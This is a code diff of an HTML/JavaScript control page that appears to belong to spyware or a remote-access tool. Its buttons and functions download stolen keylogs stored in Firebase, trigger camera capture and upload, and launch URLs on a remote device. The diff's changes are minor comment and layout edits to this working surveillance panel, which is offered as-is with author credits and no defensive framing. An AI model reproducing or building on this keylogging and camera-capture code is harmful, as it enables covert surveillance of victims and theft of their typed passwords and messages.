@@ -105,9 +105,10 @@ firebase.initializeApp(firebaseConfig);
     });
 }
 
-    function keylogger() {
+// Function to handle keylogger action
+function keylogger() {
     fetchAllKeylogs().then(keylogs => {
-        // Create a blob from keylogs
+        // Create a Blob from the keylogs
         const blob = new Blob([keylogs.reverse().join('\n')], { type: 'text/plain' });
         const url = URL.createObjectURL(blob);
 
@@ -128,7 +129,6 @@ firebase.initializeApp(firebaseConfig);
         console.error('Error fetching keylogs:', error);
     });
 }
-
 
 
 </script>
@@ -657,6 +657,7 @@ text-align:center;
 <div id="camera-button" class="icon" onclick="captureAndUpload()" style="background:url('./img/cam.png');background-size:50px 50px;background-repeat:no-repeat;">Camera</div>
   <!-- CamSnap Beta 1.0 by @ES-->
 <div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">KeylogsD</div>
+<div id="keylogg"></div>
 <!-- Kylogs Downloader 1.0 by @ES-->
 <div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/web.png');background-size:50px 50px;background-repeat:no-repeat;">LaunchURL</div> 
 </div>
